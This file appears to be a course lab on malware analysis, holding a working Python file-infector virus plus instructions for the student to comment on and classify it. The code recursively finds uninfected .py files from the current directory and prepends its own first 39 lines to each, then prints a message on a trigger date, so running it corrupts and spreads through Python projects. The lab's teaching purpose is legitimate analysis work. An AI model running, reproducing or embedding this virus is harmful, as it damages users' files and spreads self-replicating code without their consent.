# Script Name:                  Python Malware Analysis
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      06/16/2023
# Purpose:                      Copy the below Python script to your public GitHub repo. 
#                               Do not execute this script in your Ubuntu VM used for class. 
#                               If you wish to execute this script, either backup your VM using VirtualBox
#                               Snapshot or create a separate VM for testing.




# shebang Line tells the OS which interpreter to use to run the script
#!/usr/bin/python3

# Imports the OS module, which provides access to OS functionality
import os
# Imports the datetime module from the Python standard library and provides classes and functions for working with dates and times.
import datetime

#  Virus Signature Detection
SIGNATURE = "VIRUS"

# Looks for files to infect in the provided path
def locate(path):
    # Variable given an empty list to begin with
    files_targeted = []
    # 
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()



# Perform an analysis of the Python-based code.
#                            
#                            Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#                            Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#                            Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
#                            Stretch Goals (Optional Objectives)
#                            Pursue stretch goals if you are a more advanced user or have remaining lab time.
#                            
#                            In your submission, include comments towards the bottom explaining the below:
#                            
#                            Identify all the core Python/coding tools used by this script, e.g. functions.
#                            What kind of malware is this? Define this type of malware in your own words.
#                            How well is this code written? Would you have done something differently to achieve the same objective?
#                            Submission Instructions
#                            When you are ready to submit your shell script for grading, ACP it from VS Code to your public GitHub repository. Name the file according to your course code and assignment, e.g. ops-301d1: Challenge 01.
#                            Copy the URL to your GitHub file and paste below as your submission. Add a comment in your Canvas assignment which includes the following:
#                            A question within the context of today’s lab assignment
#                            An observation about the lab assignment, or related ‘Ah-hah!’ moment
#                            How long you spent working on this assignment